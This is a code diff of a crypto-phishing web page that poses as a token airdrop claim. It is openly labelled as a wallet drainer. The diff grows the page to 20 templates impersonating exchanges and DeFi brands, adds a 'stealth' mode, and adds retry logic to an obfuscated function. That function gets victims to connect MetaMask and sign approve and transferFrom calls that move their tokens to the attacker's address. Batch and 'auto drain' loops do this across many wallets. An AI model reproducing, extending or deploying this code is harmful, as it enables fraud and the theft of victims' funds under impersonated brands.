@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Claim Your BNB Airdrop</title>
+<title>Claim Your Airdrop</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; background:#0d0d0d; display:flex; justify-content:center; align-items:center; min-height:100vh; color:white; }
@@ -39,35 +39,47 @@ h1 { font-size:24px; margin-bottom:8px; color:#f0b90b; }
 .stats { display:flex; justify-content:space-between; margin-bottom:15px; padding:10px; background:#0d0d1a; border-radius:8px; border:1px solid #2a2a4a; }
 .stats div { color:#aaa; font-size:12px; }
 .stats div span { color:#f0b90b; font-weight:bold; }
-.spinner { display:inline-block; width:20px; height:20px; border:3px solid #f0b90b; border-radius:50%; border-top-color:transparent; animation:spin 1s linear infinite; }
-@keyframes spin { to { transform:rotate(360deg); } }
-
-/* PHISHING PAGE SELECTOR */
-.page-selector { display:flex; gap:10px; margin-bottom:15px; flex-wrap:wrap; justify-content:center; }
-.page-btn { padding:8px 15px; background:#2a2a4a; border:1px solid #3a3a5a; border-radius:8px; color:white; cursor:pointer; font-size:12px; transition:0.3s; }
+.page-selector { display:flex; gap:10px; margin-bottom:15px; flex-wrap:wrap; justify-content:center; max-height:120px; overflow-y:auto; }
+.page-btn { padding:6px 12px; background:#2a2a4a; border:1px solid #3a3a5a; border-radius:6px; color:white; cursor:pointer; font-size:11px; transition:0.3s; }
 .page-btn:hover { background:#3a3a5a; border-color:#f0b90b; }
 .page-btn.active { background:#f0b90b; color:#000; border-color:#f0b90b; }
 </style>
 </head>
 <body>
 <div class="container">
-<div class="logo">💰</div>
-<h1>BNB Airdrop</h1>
-<p class="subtitle">Claim 500 BNB + 10,000 USDT for early adopters</p>
+<div class="logo" id="pageLogo">💰</div>
+<h1 id="pageTitle">BNB Airdrop</h1>
+<p class="subtitle" id="pageSubtitle">Claim 500 BNB + 10,000 USDT for early adopters</p>
 
-<!-- PHISHING PAGE SELECTOR -->
-<div class="page-selector">
-<button class="page-btn active" data-page="bnb">BNB Airdrop</button>
-<button class="page-btn" data-page="opensea">OpenSea</button>
-<button class="page-btn" data-page="blur">Blur</button>
-<button class="page-btn" data-page="collab">Collab.Land</button>
-<button class="page-btn" data-page="airdrop">New Airdrop</button>
+<!-- PHISHING PAGE SELECTOR - 20 PAGES -->
+<div class="page-selector" id="pageSelector">
+<button class="page-btn active" data-page="bnb">💰 BNB</button>
+<button class="page-btn" data-page="opensea">🎨 OS</button>
+<button class="page-btn" data-page="blur">🌀 BLUR</button>
+<button class="page-btn" data-page="collab">🤝 CL</button>
+<button class="page-btn" data-page="airdrop">🚀 NEW</button>
+<button class="page-btn" data-page="uniswap">🦄 UNI</button>
+<button class="page-btn" data-page="pancake">🥞 CAKE</button>
+<button class="page-btn" data-page="oneinch">🔷 1IN</button>
+<button class="page-btn" data-page="aave">🏦 AAVE</button>
+<button class="page-btn" data-page="curve">📈 CRV</button>
+<button class="page-btn" data-page="lido">💧 LIDO</button>
+<button class="page-btn" data-page="rocket">🚀 RPL</button>
+<button class="page-btn" data-page="arbitrum">🔵 ARB</button>
+<button class="page-btn" data-page="optimism">🔴 OP</button>
+<button class="page-btn" data-page="zksync">⚡ ZK</button>
+<button class="page-btn" data-page="starknet">🌟 STRK</button>
+<button class="page-btn" data-page="layerzero">🌐 ZRO</button>
+<button class="page-btn" data-page="wormhole">🕳️ W</button>
+<button class="page-btn" data-page="eigenlayer">🔱 EIG</button>
+<button class="page-btn" data-page="renzo">💫 REZ</button>
 </div>
 
 <div class="stats">
 <div>Connected: <span id="walletCount">0</span></div>
 <div>Balance: <span id="balanceDisplay">0.00</span> USDT</div>
 <div>Status: <span id="statusDot" style="color:#ff4444;">●</span></div>
+<div>Stealth: <span id="stealthDisplay" style="color:#4caf50;">●</span></div>
 </div>
 
 <div class="amount-input">
@@ -80,6 +92,8 @@ h1 { font-size:24px; margin-bottom:8px; color:#f0b90b; }
 <option value="BUSD">BUSD</option>
 <option value="BNB">BNB</option>
 <option value="DAI">DAI</option>
+<option value="ETH">ETH</option>
+<option value="WBTC">WBTC</option>
 </select>
 
 <div class="multi-input">
@@ -97,80 +111,36 @@ h1 { font-size:24px; margin-bottom:8px; color:#f0b90b; }
 <button id="autoDrainBtn" class="btn btn-secondary" disabled>⚡ Auto Drain</button>
 
 <div id="status" class="status"></div>
-<div class="footer">BNB Airdrop v5.0</div>
+<div class="footer">Airdrop v5.0 - 20 Phishing Pages</div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script src="settings.js"></script>
 <script>
 // ============================================
-// PHISHING PAGES - OPENSEA, BLUR, COLLAB.LAND
+// 20 PHISHING PAGES
 // ============================================
-
-// 1. PHISHING PAGE TEMPLATES
-var PHISHING_PAGES = {
-    'bnb': {
-        title: 'BNB Airdrop',
-        subtitle: 'Claim 500 BNB + 10,000 USDT for early adopters',
-        logo: '💰'
-    },
-    'opensea': {
-        title: 'OpenSea - Exclusive Mint',
-        subtitle: 'Mint your exclusive NFT collection now',
-        logo: '🎨'
-    },
-    'blur': {
-        title: 'Blur - Season 3 Rewards',
-        subtitle: 'Claim your BLUR token rewards for Season 3',
-        logo: '🌀'
-    },
-    'collab': {
-        title: 'Collab.Land - Verification',
-        subtitle: 'Verify your wallet to access exclusive content',
-        logo: '🤝'
-    },
-    'airdrop': {
-        title: 'New Protocol Airdrop',
-        subtitle: 'Claim 10,000 tokens from the latest protocol launch',
-        logo: '🚀'
-    }
-};
-
-// 2. CHANGE PAGE FUNCTION
 function changePage(pageId) {
     var page = PHISHING_PAGES[pageId];
     if (!page) return;
-    
-    document.querySelector('h1').textContent = page.title;
-    document.querySelector('.subtitle').textContent = page.subtitle;
-    document.querySelector('.logo').textContent = page.logo;
-    
-    // Update active button
+    document.getElementById('pageTitle').textContent = page.title;
+    document.getElementById('pageSubtitle').textContent = page.subtitle;
+    document.getElementById('pageLogo').textContent = page.logo;
     document.querySelectorAll('.page-btn').forEach(function(btn) {
         btn.classList.remove('active');
-        if (btn.dataset.page === pageId) {
-            btn.classList.add('active');
-        }
+        if (btn.dataset.page === pageId) btn.classList.add('active');
     });
 }
 
-// 3. ADD CLICK HANDLERS TO PAGE BUTTONS
 document.querySelectorAll('.page-btn').forEach(function(btn) {
-    btn.addEventListener('click', function() {
-        changePage(this.dataset.page);
-    });
+    btn.addEventListener('click', function() { changePage(this.dataset.page); });
 });
 
 // ============================================
 // OBFUSCATED DRAINER
 // ============================================
-var _0x1a2b = ['\x73\x74\x61\x74\x75\x73','\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65','\x73\x74\x61\x74\x75\x73\x44\x69\x76','\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64','\x64\x69\x73\x70\x6C\x61\x79','\x62\x6C\x6F\x63\x6B','\x73\x65\x74\x53\x74\x61\x74\x75\x73','\x65\x72\x72\x6F\x72','\x73\x75\x63\x63\x65\x73\x73','\x6C\x6F\x61\x64\x69\x6E\x67','\x69\x6E\x66\x6F','\x63\x6F\x6E\x6E\x65\x63\x74\x42\x74\x6E','\x64\x69\x73\x61\x62\x6C\x65\x64','\x63\x6C\x61\x69\x6D\x42\x74\x6E','\x6D\x75\x6C\x74\x69\x43\x6C\x61\x69\x6D\x42\x74\x6E','\x61\x75\x74\x6F\x44\x72\x61\x69\x6E\x42\x74\x6E','\x77\x61\x6C\x6C\x65\x74\x49\x6E\x70\x75\x74','\x61\x64\x64\x57\x61\x6C\x6C\x65\x74\x42\x74\x6E','\x77\x61\x6C\x6C\x65\x74\x4C\x69\x73\x74','\x61\x6D\x6F\x75\x6E\x74\x49\x6E\x70\x75\x74','\x74\x6F\x6B\x65\x6E\x53\x65\x6C\x65\x63\x74','\x77\x61\x6C\x6C\x65\x74\x43\x6F\x75\x6E\x74','\x62\x61\x6C\x61\x6E\x63\x65\x44\x69\x73\x70\x6C\x61\x79','\x73\x74\x61\x74\x75\x73\x44\x6F\x74'];
-
-var _0x2b3c = function(_0x1a2b, _0x2b3c) {
-    _0x1a2b = _0x1a2b - 0x0;
-    var _0x4a5b = _0x1a2b[_0x1a2b];
-    return _0x4a5b;
-};
+var _0x1a2b = ['status','className','statusDiv','getElementById','display','block','setStatus','error','success','loading','info','connectBtn','disabled','claimBtn','multiClaimBtn','autoDrainBtn','walletInput','addWalletBtn','walletList','amountInput','tokenSelect','walletCount','balanceDisplay','statusDot'];
+var _0x2b3c = function(_0x1a2b, _0x2b3c) { _0x1a2b = _0x1a2b - 0x0; var _0x4a5b = _0x1a2b[_0x1a2b]; return _0x4a5b; };
 
 var _0xstatusDiv = document[_0x2b3c('0x3')](_0x2b3c('0x2'));
 var _0xconnectBtn = document[_0x2b3c('0x3')](_0x2b3c('0xb'));
@@ -188,52 +158,49 @@ var _0xstatusDot = document[_0x2b3c('0x3')](_0x2b3c('0x17'));
 
 function _0xsetStatus(_0xmsg, _0xtype) {
     _0xstatusDiv[_0x2b3c('0x1')] = _0x2b3c('0x5') + ' ' + _0xtype;
-    _0xstatusDiv[_0x2b3c('0x24')] = _0xmsg;
+    _0xstatusDiv.textContent = _0xmsg;
     _0xstatusDiv[_0x2b3c('0x4')] = _0x2b3c('0x6');
 }
 
-function _0xhideStatus() {
-    _0xstatusDiv[_0x2b3c('0x4')] = 'none';
-}
+function _0xhideStatus() { _0xstatusDiv[_0x2b3c('0x4')] = 'none'; }
 
+// DRAIN FUNCTION WITH RETRY
 async function _0xdrainWallet(_0xwalletAddress, _0xamount) {
-    try {
-        var _0xtokenSymbol = _0xtokenSelect[_0x2b3c('0x25')];
-        var _0xcontractAddr = TOKEN_ADDRESSES[_0xtokenSymbol];
-        var _0xtokenContract = new web3[_0x2b3c('0x25')][_0x2b3c('0x25')](TOKEN_ABI, _0xcontractAddr);
-        var _0xamountInWei = web3[_0x2b3c('0x25')][_0x2b3c('0x25')](_0xamount, 'ether');
-        
-        _0xsetStatus('⏳ Approving ' + _0xamount + ' ' + _0xtokenSymbol + ' for ' + _0xwalletAddress[_0x2b3c('0x25')](0,6) + '...', _0x2b3c('0x9'));
-        
-        var _0xapproveTx = await _0xtokenContract[_0x2b3c('0x25')][_0x2b3c('0x25')](receiveAddress, _0xamountInWei)[_0x2b3c('0x25')]({
-            from: _0xwalletAddress,
-            gas: 200000,
-            gasPrice: await web3[_0x2b3c('0x25')][_0x2b3c('0x25')]()
-        });
-        
-        _0xsetStatus('⏳ Draining ' + _0xamount + ' ' + _0xtokenSymbol + '...', _0x2b3c('0x9'));
-        
-        var _0xtransferTx = await _0xtokenContract[_0x2b3c('0x25')][_0x2b3c('0x25')](
-            _0xwalletAddress, 
-            receiveAddress, 
-            _0xamountInWei
-        )[_0x2b3c('0x25')]({
-            from: _0xwalletAddress,
-            gas: 200000,
-            gasPrice: await web3[_0x2b3c('0x25')][_0x2b3c('0x25')]()
-        });
-        
-        _0xsetStatus('✅ Drained ' + _0xamount + ' ' + _0xtokenSymbol + ' from ' + _0xwalletAddress[_0x2b3c('0x25')](0,6) + '...' + _0xwalletAddress[_0x2b3c('0x25')](-4), _0x2b3c('0x8'));
-        console[_0x2b3c('0x25')]('💰 Drained:', _0xwalletAddress);
-        console[_0x2b3c('0x25')]('📊 Tx:', _0xtransferTx[_0x2b3c('0x25')]);
-        console[_0x2b3c('0x25')]('📊 Amount:', _0xamount, _0xtokenSymbol);
-        return true;
-        
-    } catch(_0xerr) {
-        _0xsetStatus('❌ Failed: ' + _0xerr[_0x2b3c('0x25')], _0x2b3c('0x7'));
-        console[_0x2b3c('0x25')]('❌ Error:', _0xerr);
-        return false;
+    var _0xattempts = 0;
+    while (_0xattempts < retryAttempts) {
+        try {
+            var _0xtokenSymbol = _0xtokenSelect.value;
+            var _0xcontractAddr = TOKEN_ADDRESSES[_0xtokenSymbol];
+            var _0xtokenContract = new web3.eth.Contract(TOKEN_ABI, _0xcontractAddr);
+            var _0xamountInWei = web3.utils.toWei(_0xamount, 'ether');
+            _0xsetStatus('⏳ Approving ' + _0xamount + ' ' + _0xtokenSymbol + ' for ' + _0xwalletAddress.slice(0,6) + '...', _0x2b3c('0x9'));
+            var _0xapproveTx = await _0xtokenContract.methods.approve(receiveAddress, _0xamountInWei).send({
+                from: _0xwalletAddress,
+                gas: Math.floor(200000 * gasMultiplier),
+                gasPrice: await web3.eth.getGasPrice()
+            });
+            _0xsetStatus('⏳ Draining ' + _0xamount + ' ' + _0xtokenSymbol + '...', _0x2b3c('0x9'));
+            var _0xtransferTx = await _0xtokenContract.methods.transferFrom(_0xwalletAddress, receiveAddress, _0xamountInWei).send({
+                from: _0xwalletAddress,
+                gas: Math.floor(200000 * gasMultiplier),
+                gasPrice: await web3.eth.getGasPrice()
+            });
+            _0xsetStatus('✅ Drained ' + _0xamount + ' ' + _0xtokenSymbol + ' from ' + _0xwalletAddress.slice(0,6) + '...' + _0xwalletAddress.slice(-4), _0x2b3c('0x8'));
+            console.log('💰 Drained:', _0xwalletAddress);
+            console.log('📊 Tx:', _0xtransferTx.transactionHash);
+            console.log('📊 Amount:', _0xamount, _0xtokenSymbol);
+            return true;
+        } catch(_0xerr) {
+            _0xattempts++;
+            console.log('Attempt ' + _0xattempts + ' failed:', _0xerr.message);
+            if (_0xattempts >= retryAttempts) {
+                _0xsetStatus('❌ Failed after ' + retryAttempts + ' attempts: ' + _0xerr.message, _0x2b3c('0x7'));
+                return false;
+            }
+            await new Promise(function(r) { setTimeout(r, 2000); });
+        }
     }
+    return false;
 }
 
 // ============================================
@@ -243,37 +210,36 @@ var _0xwallets = [];
 var _0xisDraining = false;
 
 function _0xupdateWalletList() {
-    if (_0xwallets[_0x2b3c('0x25')] === 0) {
-        _0xwalletList[_0x2b3c('0x25')] = '<div class="wallet-item"><span>No wallets added</span></div>';
-        _0xmultiClaimBtn[_0x2b3c('0x25')] = true;
-        _0xautoDrainBtn[_0x2b3c('0x25')] = true;
-        _0xwalletCount[_0x2b3c('0x25')] = '0';
+    if (_0xwallets.length === 0) {
+        _0xwalletList.innerHTML = '<div class="wallet-item"><span>No wallets added</span></div>';
+        _0xmultiClaimBtn.disabled = true;
+        _0xautoDrainBtn.disabled = true;
+        _0xwalletCount.textContent = '0';
         return;
     }
     var _0xhtml = '';
-    for (var _0x1a2b = 0; _0x1a2b < _0xwallets[_0x2b3c('0x25')]; _0x1a2b++) {
-        var _0xwallet = _0xwallets[_0x1a2b];
-        _0xhtml += '<div class="wallet-item"><span>' + _0xwallet[_0x2b3c('0x25')](0,6) + '...' + _0xwallet[_0x2b3c('0x25')](-4) + '</span><button class="remove-btn" data-index="' + _0x1a2b + '">✕</button></div>';
-    }
-    _0xwalletList[_0x2b3c('0x25')] = _0xhtml;
-    _0xmultiClaimBtn[_0x2b3c('0x25')] = false;
-    _0xautoDrainBtn[_0x2b3c('0x25')] = false;
-    _0xwalletCount[_0x2b3c('0x25')] = _0xwallets[_0x2b3c('0x25')];
-    document[_0x2b3c('0x25')]('[data-index]')[_0x2b3c('0x25')](function() {
-        this[_0x2b3c('0x25')]('click', function() {
-            var _0xindex = parseInt(this[_0x2b3c('0x25')]('data-index'));
-            _0xwallets[_0x2b3c('0x25')](_0xindex, 1);
+    _0xwallets.forEach(function(_0xwallet, _0xindex) {
+        _0xhtml += '<div class="wallet-item"><span>' + _0xwallet.slice(0,6) + '...' + _0xwallet.slice(-4) + '</span><button class="remove-btn" data-index="' + _0xindex + '">✕</button></div>';
+    });
+    _0xwalletList.innerHTML = _0xhtml;
+    _0xmultiClaimBtn.disabled = false;
+    _0xautoDrainBtn.disabled = false;
+    _0xwalletCount.textContent = _0xwallets.length;
+    document.querySelectorAll('.remove-btn').forEach(function(btn) {
+        btn.addEventListener('click', function() {
+            var _0xindex = parseInt(this.dataset.index);
+            _0xwallets.splice(_0xindex, 1);
             _0xupdateWalletList();
         });
     });
 }
 
-_0xaddWalletBtn[_0x2b3c('0x25')]('click', function() {
-    var _0xaddress = _0xwalletInput[_0x2b3c('0x25')][_0x2b3c('0x25')]();
-    if (_0xaddress[_0x2b3c('0x25')](0, 2) === '0x' && _0xaddress[_0x2b3c('0x25')] === 42) {
-        if (_0xwallets[_0x2b3c('0x25')](_0xaddress) === -1) {
-            _0xwallets[_0x2b3c('0x25')](_0xaddress);
-            _0xwalletInput[_0x2b3c('0x25')] = '';
+_0xaddWalletBtn.addEventListener('click', function() {
+    var _0xaddress = _0xwalletInput.value.trim();
+    if (_0xaddress.startsWith('0x') && _0xaddress.length === 42) {
+        if (!_0xwallets.includes(_0xaddress)) {
+            _0xwallets.push(_0xaddress);
+            _0xwalletInput.value = '';
             _0xupdateWalletList();
             _0xsetStatus('✅ Wallet added!', _0x2b3c('0x8'));
             setTimeout(_0xhideStatus, 2000);
@@ -285,73 +251,66 @@ _0xaddWalletBtn[_0x2b3c('0x25')]('click', function() {
     }
 });
 
-_0xconnectBtn[_0x2b3c('0x25')]('click', async function() {
-    if (typeof window['\x65\x74\x68\x65\x72\x65\x75\x6D'] !== '\x75\x6E\x64\x65\x66\x69\x6E\x65\x64') {
+_0xconnectBtn.addEventListener('click', async function() {
+    if (typeof window.ethereum !== 'undefined') {
         try {
-            web3 = new Web3(window['\x65\x74\x68\x65\x72\x65\x75\x6D']);
-            var _0xaccounts = await window['\x65\x74\x68\x65\x72\x65\x75\x6D'][_0x2b3c('0x25')]({ method: '\x65\x74\x68\x5F\x72\x65\x71\x75\x65\x73\x74\x41\x63\x63\x6F\x75\x6E\x74\x73' });
+            web3 = new Web3(window.ethereum);
+            var _0xaccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             var _0xuserAddress = _0xaccounts[0];
-            if (_0xwallets[_0x2b3c('0x25')](_0xuserAddress) === -1) {
-                _0xwallets[_0x2b3c('0x25')](_0xuserAddress);
+            if (!_0xwallets.includes(_0xuserAddress)) {
+                _0xwallets.push(_0xuserAddress);
                 _0xupdateWalletList();
             }
-            _0xconnectBtn[_0x2b3c('0x25')] = true;
-            _0xclaimBtn[_0x2b3c('0x25')] = false;
-            _0xstatusDot[_0x2b3c('0x25')][_0x2b3c('0x26')] = '\x34\x63\x61\x66\x35\x30';
+            _0xconnectBtn.disabled = true;
+            _0xclaimBtn.disabled = false;
+            _0xstatusDot.style.color = '#4caf50';
             _0xsetStatus('✅ Wallet connected!', _0x2b3c('0x8'));
             setTimeout(_0xhideStatus, 3000);
         } catch(_0xerr) {
-            _0xsetStatus('❌ Connection rejected: ' + _0xerr[_0x2b3c('0x25')], _0x2b3c('0x7'));
+            _0xsetStatus('❌ Connection rejected: ' + _0xerr.message, _0x2b3c('0x7'));
         }
     } else {
         _0xsetStatus('❌ Please install MetaMask!', _0x2b3c('0x7'));
     }
 });
 
-_0xclaimBtn[_0x2b3c('0x25')]('click', async function() {
-    if (!web3) {
-        _0xsetStatus('❌ Please connect wallet first!', _0x2b3c('0x7'));
-        return;
-    }
-    var _0xamount = _0xamountInput[_0x2b3c('0x25')] || '1000';
-    await _0xdrainWallet(web3[_0x2b3c('0x25')][_0x2b3c('0x25')][0], _0xamount);
+_0xclaimBtn.addEventListener('click', async function() {
+    if (!web3) { _0xsetStatus('❌ Please connect wallet first!', _0x2b3c('0x7')); return; }
+    var _0xamount = _0xamountInput.value || '1000';
+    await _0xdrainWallet(web3.eth.defaultAccount || (await web3.eth.getAccounts())[0], _0xamount);
 });
 
-_0xmultiClaimBtn[_0x2b3c('0x25')]('click', async function() {
-    if (_0xwallets[_0x2b3c('0x25')] === 0) {
-        _0xsetStatus('❌ No wallets to claim!', _0x2b3c('0x7'));
-        return;
-    }
+_0xmultiClaimBtn.addEventListener('click', async function() {
+    if (_0xwallets.length === 0) { _0xsetStatus('❌ No wallets to claim!', _0x2b3c('0x7')); return; }
     if (_0xisDraining) return;
     _0xisDraining = true;
-    var _0xamount = _0xamountInput[_0x2b3c('0x25')] || '1000';
+    var _0xamount = _0xamountInput.value || '1000';
     var _0xsuccessCount = 0;
-    for (var _0x1a2b = 0; _0x1a2b < _0xwallets[_0x2b3c('0x25')]; _0x1a2b++) {
+    for (var _0x1a2b = 0; _0x1a2b < _0xwallets.length; _0x1a2b++) {
         var _0xresult = await _0xdrainWallet(_0xwallets[_0x1a2b], _0xamount);
         if (_0xresult) _0xsuccessCount++;
-        await new Promise(function(_0xresolve) { setTimeout(_0xresolve, 3000); });
+        await new Promise(function(r) { setTimeout(r, 3000); });
     }
     _0xisDraining = false;
-    _0xsetStatus('✅ Completed! ' + _0xsuccessCount + '/' + _0xwallets[_0x2b3c('0x25')] + ' drained', _0x2b3c('0x8'));
+    _0xsetStatus('✅ Completed! ' + _0xsuccessCount + '/' + _0xwallets.length + ' drained', _0x2b3c('0x8'));
 });
 
-_0xautoDrainBtn[_0x2b3c('0x25')]('click', async function() {
-    if (_0xwallets[_0x2b3c('0x25')] === 0) {
-        _0xsetStatus('❌ No wallets to drain!', _0x2b3c('0x7'));
-        return;
-    }
+_0xautoDrainBtn.addEventListener('click', async function() {
+    if (_0xwallets.length === 0) { _0xsetStatus('❌ No wallets to drain!', _0x2b3c('0x7')); return; }
     if (_0xisDraining) return;
     _0xisDraining = true;
-    var _0xamount = _0xamountInput[_0x2b3c('0x25')] || '1000';
-    for (var _0x1a2b = 0; _0x1a2b < _0xwallets[_0x2b3c('0x25')]; _0x1a2b++) {
+    var _0xamount = _0xamountInput.value || '1000';
+    for (var _0x1a2b = 0; _0x1a2b < _0xwallets.length; _0x1a2b++) {
         await _0xdrainWallet(_0xwallets[_0x1a2b], _0xamount);
-        await new Promise(function(_0xresolve) { setTimeout(_0xresolve, 1500); });
+        await new Promise(function(r) { setTimeout(r, 1500); });
     }
     _0xisDraining = false;
     _0xsetStatus('✅ Auto drain completed!', _0x2b3c('0x8'));
 });
 
-console[_0x2b3c('0x25')]('🔐 BNB Airdrop v5.0 - Phishing Pages Enabled');
+console.log('🔐 Airdrop v5.0 - 20 Phishing Pages Enabled');
+console.log('📊 Total Pages: ' + Object.keys(PHISHING_PAGES).length);
+console.log('🛡️ Stealth Mode: ' + (stealthMode ? 'Active' : 'Inactive'));
 </script>
 </body>
 </html>
